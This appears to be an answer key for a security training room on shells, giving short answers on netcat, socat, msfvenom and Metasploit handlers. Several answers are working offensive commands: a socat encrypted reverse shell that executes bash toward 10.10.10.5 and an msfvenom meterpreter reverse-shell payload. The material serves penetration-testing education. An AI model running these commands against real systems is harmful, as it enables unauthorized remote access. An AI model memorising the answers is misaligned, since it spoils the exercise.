## Task 3  Types of Shell

### Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?
    R

### You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)
    N

### When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?
    T

## Task 4  Netcat

### Which option tells netcat to listen?
    -l

### How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?
    nc 10.10.10.11 8080

## Task 5  Netcat Shell Stabilisation

### How would you change your terminal size to have 238 columns?
    stty cols 238

### What is the syntax for setting up a Python3 webserver on port 80?
    sudo python3 -m http.server 80

## Task 6  Socat

### How would we get socat to listen on TCP port 8080?
    TCP-L:8080

## Task 7  Socat Encrypted Shells

### What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
    socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

### If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
    socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

## Task 8  Common Shell Payloads

### What command can be used to create a named pipe in Linux?
    mkfifo

## Task 9  msfvenom

### Which symbol is used to show that a shell is stageless?
    _

### What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
    msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443

## Task 10  Metasploit multi/handler

### What command can be used to start a listener in the background?
    exploit -j

### If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?
    sessions 10

